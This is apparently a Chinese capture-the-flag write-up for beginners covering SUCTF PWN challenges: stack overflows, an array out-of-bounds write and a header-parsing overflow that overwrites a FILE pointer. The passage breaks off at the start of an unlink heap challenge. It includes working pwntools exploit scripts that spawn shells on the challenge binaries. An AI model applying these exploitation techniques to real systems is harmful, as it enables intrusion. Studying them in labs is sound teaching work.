@@ -1,0 +1,1093 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>此次的SUCTF招新赛的PWN题一共有七题，难度算是逐步上升吧，写个稍微详细一点的WP，希望能给刚刚入门的萌新PWNer一点帮助</p>
+<p>题目的名字被我统一改成了supwn1-7，对应这下面的七题，我也放到百度云上了：</p>
+<p>链接：<a href="https://pan.baidu.com/s/1rnsyHCQzziS53AZZ-NTHzA" target="_blank">https://pan.baidu.com/s/1rnsyHCQzziS53AZZ-NTHzA</a><br/>
+提取码：1ha2</p>
+<h1 data-content="1" id="08de6bb5f48750bccc86692ee7940201">stack</h1>
+<p>这是一道基础的栈溢出的题目，通过<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank">checksec</a>可以看到该程序什么保护机制都没开，它是一个64位的小端序的elf程序，当然也可以通过file命令来查看程序的基本信息</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121190722-9e794584-ed7d-1.png"/></p>
+<div class="highlight"><pre><span></span>$ file supwn1
+supwn1: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID <span class="o">[</span>sha1<span class="o">]</span> <span class="o">=</span> b2842040168e718fe077a170b5ad273fbb0d28d6, not stripped
+</pre></div>
+<p>通过将程序拖入IDA中，可以看到它的反编译后的程序逻辑：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121190816-beba2e80-ed7d-1.png"/></p>
+<p>可以看到，该程序首先输出了一个字符串样式“suctf”，接着调用了read函数，向buf中读入0x30个字节</p>
+<p>而在IDA中可以看到，buf的空间大小只有0x20个字节，这里明显造成的栈溢出，可以通过覆盖一个八字节ebp+一个八字节的跳转地址，实现控制程序的流程</p>
+<p>另外有的时候，buf的栈空间大小并不能单纯的从上面的【rbp-20h】看出，它还可能是rsp寻址，得看【rsp+0h】，在这种情况下，可以使用gdb调试的一种插件---<a href="https://gef.readthedocs.io/en/latest/commands/pattern/" target="_blank">GEF的pattern功能</a>来测出偏移的大小</p>
+<p>就以这题为例子，我们打开gdb-gef：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121190905-dc177a6e-ed7d-1.png"/></p>
+<p>首先创建一大串远远超过栈空间的字符串，然后输入进程序中：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121190929-ea362492-ed7d-1.png"/></p>
+<p>不出意外的，可以看到程序崩溃了，然后我们用 <code>pattern find $rbp</code>命令去查找到rbp的偏移</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121190952-f8260edc-ed7d-1.png"/></p>
+<p>可以发现，找到了偏移32，也就是0x20，是buf到rbp的距离</p>
+<p><a href="https://gef.readthedocs.io" target="_blank">GEF</a>还有很多很实用的功能，具体可以去探索一下，另外还有类似的gdb插件：<a href="https://github.com/pwndbg/pwndbg" target="_blank">pwndbg</a></p>
+<p>接着，我们找到了偏移，就需要写一个exp脚本进行利用漏洞从而拿到flag</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121191006-0047909a-ed7e-1.png"/></p>
+<p>这里可以看到，IDA中有个next_door函数，它直接调用了一个system(/bin/sh)函数，如果之前的栈溢出控制跳转能够跳转到这里，那么就能实现getshell，从而拿到flag</p>
+<p>我写exp脚本一般是python+<a href="https://docs.pwntools.com/en/stable/" target="_blank">pwntools</a></p>
+<p>这里直接放脚本吧，结合着注释应该可以理解</p>
+<div class="highlight"><pre><span></span><span class="c1">#encoding:utf-8</span>
+<span class="c1">#!/upr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span><span class="c1">#引入pwntools模块</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span><span class="c1">#设置调试模式，可以看到输入和输出的具体信息</span>
+
+<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">"./supwn1"</span><span class="p">)</span><span class="c1">#打开该elf文件，这里我统一把原来题目的名字改了</span>
+<span class="c1">#如果是连接远程端则用：p.remote("ip",端口)</span>
+
+<span class="n">binsh</span> <span class="o">=</span><span class="mh">0x400676</span><span class="c1">#这是next_door函数的地址</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="s2">"b"</span><span class="o">*</span><span class="mh">0x08</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="c1">#构造好覆盖ebp和返回地址的字符串,p64()这个函数是pwntools提供的，具体可以看官方文档查它是什么功能</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="c1">#发送该字符串</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span><span class="c1">#进行交互,获得shell</span>
+</pre></div>
+<p>如果对栈溢出的了解还不是很多的话可以参考以下链接进行学习：</p>
+<p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank">手把手教你栈溢出从入门到放弃</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack_intro/" target="_blank">CTF-WIKI</a></p>
+<h1 data-content="1" id="cfe5795290ec459f004a6859ac4c1da8">basic-pwn</h1>
+<p>这一题整体上和上一题基本上没有区别吧，都是一个栈溢出，跳转到一个函数，就可以读出flag了</p>
+<p>保护机制：只开了一个NX保护，问题不大</p>
+<pre><code>Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121191030-0f06bad4-ed7e-1.png"/></p>
+<p>不同的是，这题用了scanf的方法，没有指定读多少个，读到\n即停止，</p>
+<p>后门函数也不一样了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121191057-1f1a8536-ed7e-1.png"/></p>
+<p>溢出的原理是一样的，就不过多的重复了，可以参照第一题拿来练习练习</p>
+<p>这里直接贴exp：</p>
+<div class="highlight"><pre><span></span><span class="c1">#encoding:utf-8</span>
+<span class="c1">#!/upr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span><span class="c1">#引入pwntools模块</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span><span class="c1">#设置调试模式，可以看到输入和输出的具体信息</span>
+
+<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">"./supwn2"</span><span class="p">)</span><span class="c1">#打开该elf文件，这里我统一把原来题目的名字改了</span>
+<span class="c1">#如果是连接远程端则用：p.remote("ip",端口)</span>
+
+<span class="n">catflag</span> <span class="o">=</span> <span class="mh">0x401157</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x110</span><span class="o">+</span><span class="s2">"b"</span><span class="o">*</span><span class="mh">0x08</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">catflag</span><span class="p">)</span><span class="c1">#构造好覆盖ebp和返回地址的字符串</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="c1">#发送该字符串</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span><span class="c1">#进行交互,获得shell</span>
+</pre></div>
+<h1 data-content="1" id="7431ef0327b400b18db09d5e8989bcb8">babyarray</h1>
+<p>这题主要是利用了一个数组下标越界的漏洞</p>
+<p>先检查一遍他的保护机制：还是和上一题一样</p>
+<pre><code>Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p>接着拖入IDA分析程序的逻辑</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121191138-3763687e-ed7e-1.png"/></p>
+<p>程序首先让你输入一个十进制整数v4，然后再让你往【4*v4 +0x6010a0】的地方输入一个十进制整数</p>
+<p>这里可以看到v4的栈空间大小只有4个字节，而输入的又是一个十进制数，那么就没办法造成一个栈溢出控制程序的流程</p>
+<p>继续看程序逻辑</p>
+<p>输入完后，进行一个if判断，如果变量a为0的话，那么就会直接打印出flag，我们甚至不需要去控制程序的执行流程，双击一下a可以直接看到它所在的地址：是0x601068</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121191202-45e53bde-ed7e-1.png"/></p>
+<p>只要让这个地方的值为0，那么我们就能得到flag了</p>
+<p>从上面的输入逻辑可以发现，我们能控制【4<em>v4 +0x6010a0】的值，只要让 `4 </em> v4 +0x6010a0=0x601068`我们就能使得a为0，也就是得让v4为-14，就可以了</p>
+<p>于是这题只需要，先输入-14，然后再输入0，就可以得到flag了</p>
+<h1 data-content="1" id="23532547e3449b9d54b41f302f2a81ce">easy_overflow_file_structure</h1>
+<p>这题总的漏洞利用难度不是很大，但是发现溢出这个过程比较难，难点在于发现一个关键函数的漏洞，这比较考验个人的逆向能力</p>
+<p>保护机制：</p>
+<pre><code>Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p>程序一开始是这样的：</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-1F40h]</span>
+
+  <span class="n">init</span><span class="p">();</span>
+  <span class="n">fd</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"./readme.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x1F40</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+  <span class="n">su_server</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+  <span class="n">fclose</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>让你输入一大串东西，然后进入su_server函数</p>
+<div class="highlight"><pre><span></span><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">su_server</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// eax</span>
+  <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+1Fh] [rbp-1h]</span>
+
+  <span class="n">v1</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
+  <span class="n">srand</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mh">0x80</span><span class="p">;</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">host</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x7FuLL</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x7FuLL</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">researchfield</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x7FuLL</span><span class="p">);</span>
+  <span class="n">rand_num1</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+  <span class="n">rand_num2</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+  <span class="n">rand_num3</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">strncmp</span><span class="p">(</span><span class="s">"GET / HTTP/1.1#"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">)</span> <span class="p">)</span>
+    <span class="n">__assert_fail</span><span class="p">(</span><span class="s">"!strncmp(getMethod,http_header,sizeof(getMethod))"</span><span class="p">,</span> <span class="s">"main.c"</span><span class="p">,</span> <span class="mh">0x59u</span><span class="p">,</span> <span class="s">"su_server"</span><span class="p">);</span>
+  <span class="n">lookForHeader</span><span class="p">(</span><span class="s">"Host"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="mh">0x1F40</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">host</span><span class="p">,</span> <span class="mh">0x7Fu</span><span class="p">);</span>
+  <span class="n">lookForHeader</span><span class="p">(</span><span class="s">"Username"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="mh">0x1F40</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="mh">0x7Fu</span><span class="p">);</span>
+  <span class="n">lookForHeader</span><span class="p">(</span><span class="s">"ResearchField"</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="mh">0x1F40</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">researchfield</span><span class="p">,</span> <span class="mh">0x7Fu</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">rand_num1</span> <span class="o">!=</span> <span class="n">v3</span> <span class="o">||</span> <span class="n">rand_num2</span> <span class="o">!=</span> <span class="n">v3</span> <span class="o">||</span> <span class="n">rand_num3</span> <span class="o">!=</span> <span class="n">v3</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">fd</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">==</span> <span class="mh">0xDEADBEEF</span> <span class="p">)</span>
+    <span class="p">{</span><span class="c1">//如果能覆盖掉 fd-&gt;_flags为0xDEADBEEF的话，就能getshell拿flag了</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"66666"</span><span class="p">);</span>
+      <span class="n">secret</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="n">fclose</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+    <span class="n">fflush</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
+    <span class="n">abort</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="o">&amp;</span><span class="n">host</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">researchfield</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+
+<span class="kt">int</span> <span class="nf">secret</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"W0W~ I will be very glad if you join in Asuri~"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"This is a easy version of my fsop challenge."</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"If you want to know more about it,search for the classic technique </span><span class="se">\"</span><span class="s">fsop</span><span class="se">\"</span><span class="s">."</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>这个函数的逻辑就是把输入的那一大段的字符串，当做一个http的请求，然后根据关键词<code>Host：xxxx#</code> <code>Username：xxxx#</code> <code>ResearchField：xxxxx#</code>来区分三段字符串，分别把xxx内容放入bss段中对应的位置，xxx字符串长度不能超过127</p>
+<p>处理这些操作的函数是lookForHeader：</p>
+<div class="highlight"><pre><span></span><span class="c1">//lookForHeader(str, input, 0x1F40, &amp;target, 0x7Fu)</span>
+
+  <span class="n">str_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">result_len</span> <span class="o">=</span> <span class="mi">8000</span> <span class="o">-</span> <span class="n">str_len</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">result_len</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strncmp</span><span class="p">((</span><span class="n">input</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="n">str</span><span class="p">,</span> <span class="n">str_len</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">str_len</span> <span class="o">+</span> <span class="n">input</span><span class="p">)</span> <span class="o">==</span> <span class="sc">':'</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">+=</span> <span class="n">str_len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8000</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">input</span><span class="p">)</span> <span class="o">==</span> <span class="sc">' '</span> <span class="o">||</span> <span class="o">*</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">input</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'\t'</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+        <span class="p">;</span>
+      <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8000</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">input</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'#'</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">j</span> <span class="o">-</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;=</span> <span class="mi">127</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">n_4</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="n">input</span><span class="p">;</span>
+            <span class="k">while</span> <span class="p">(</span> <span class="n">n_4</span> <span class="o">&lt;</span> <span class="n">j</span> <span class="o">+</span> <span class="n">input</span> <span class="p">)</span>
+            <span class="p">{</span>
+              <span class="n">v5</span> <span class="o">=</span> <span class="n">target</span><span class="o">++</span><span class="p">;</span>
+              <span class="n">v6</span> <span class="o">=</span> <span class="n">n_4</span><span class="o">++</span><span class="p">;</span>
+              <span class="o">*</span><span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="p">}</span>
+          <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+</pre></div>
+<p>这里是最骚的了，当时看了好久以为这个函数没有太大问题，但实际上有问题</p>
+<p>问题在函数开头这里：<code>for ( i = 0; ; ++i )</code></p>
+<p>这里会导致，如果输入的input中，有个多个<code>Host：xxxx#</code>的输入，那么for循环就还会继续，而也就会导致溢出，能往target的位置输入超过127个字符</p>
+<p>只要利用了这一点，漏洞就很容易触发了</p>
+<p>可以发现ResearchField在bss段的位置中，末尾很接近fd，而只要把fd指向的内容为0xDEADBEEF就可以getshell</p>
+<pre><code>.bss:000000000060217C                 db    ? ;
+.bss:000000000060217D                 db    ? ;
+.bss:000000000060217E                 db    ? ;
+.bss:000000000060217F rand_num3       db ?                 
+.bss:000000000060217F                                         
+.bss:0000000000602180                 public fd
+.bss:0000000000602180 ; FILE *fd
+.bss:0000000000602180 fd              dq ?                    
+.bss:0000000000602180                                    
+.bss:0000000000602188                 align 20h
+.bss:00000000006021A0                 public username
+.bss:00000000006021A0 username        db    ? ;
+.bss:00000000006021A0                                      
+.bss:00000000006021A1                 db    ? ;
+.bss:00000000006021A2                 db    ? ;
+------------------------------------------------------------
+  if ( rand_num1 != v3 || rand_num2 != v3 || rand_num3 != v3 )
+  {
+    if ( fd-&gt;_flags == 0xDEADBEEF )
+    {
+      puts("66666");
+      secret();
+    }
+    fclose(fd);
+    fflush(stderr);
+    abort();
+  }</code></pre>
+<p>exp如下：</p>
+<div class="highlight"><pre><span></span><span class="c1">#encoding:utf-8</span>
+<span class="c1">#!/upr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
+<span class="n">bin_elf</span> <span class="o">=</span> <span class="s2">"./supwn4"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span><span class="o">=</span><span class="n">bin_elf</span>
+<span class="c1">#libc = ELF("./libc-2.23.so")</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">bin_elf</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"r"</span><span class="p">:</span><span class="c1">#在命令窗口中输入 python supwn4.py r 表示接入远程端的程序</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"4xxxxx3"</span><span class="p">,</span><span class="mi">10002</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"l"</span><span class="p">:</span><span class="c1">#在命令窗口中输入python supwn4.py l 表示本地进行调试</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">bin_elf</span><span class="p">)</span>
+<span class="c1">#-------------------------------------</span>
+<span class="c1">#定义这些函数是我个人比较偷懒的写法，因为懒得输入各种p.xxxx()</span>
+<span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">rc</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">timeout</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">ru</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">timeout</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sda</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">getshell</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1">#-------------------------------------</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"GET / HTTP/1.1#"</span>
+<span class="n">payload</span> <span class="o">+=</span><span class="s2">"Host:"</span><span class="o">+</span><span class="s2">"a"</span><span class="o">*</span><span class="mh">0x7e</span><span class="o">+</span><span class="s2">"#"</span>
+<span class="n">payload</span> <span class="o">+=</span><span class="s2">"Username:"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xDEADBEEF</span><span class="p">)</span><span class="o">+</span><span class="s2">"#"</span>
+<span class="n">payload</span> <span class="o">+=</span><span class="s2">"ResearchField:"</span><span class="o">+</span><span class="s2">"c"</span><span class="o">*</span><span class="mh">0x7e</span><span class="o">+</span><span class="s2">"#"</span>
+<span class="n">payload</span> <span class="o">+=</span><span class="s2">"ResearchField:"</span><span class="o">+</span><span class="s2">"aa"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6021A0</span><span class="p">)</span><span class="o">+</span><span class="s2">"#"</span>
+<span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">getshell</span><span class="p">()</span>
+</pre></div>
+<h1 data-content="1" id="8c2d7f917719ceeeb4e4ea7e1e214304">unlink</h1>
+<p>这题是经典的堆漏洞中的unlink</p>
+<p>保护机制：开了nx和<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/Canary/" target="_blank">canary</a></p>
+<pre><code>Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p>IDA查看一波：</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">init</span><span class="p">();</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"welcome to note system"</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">menu</span><span class="p">();</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"please chooice :"</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
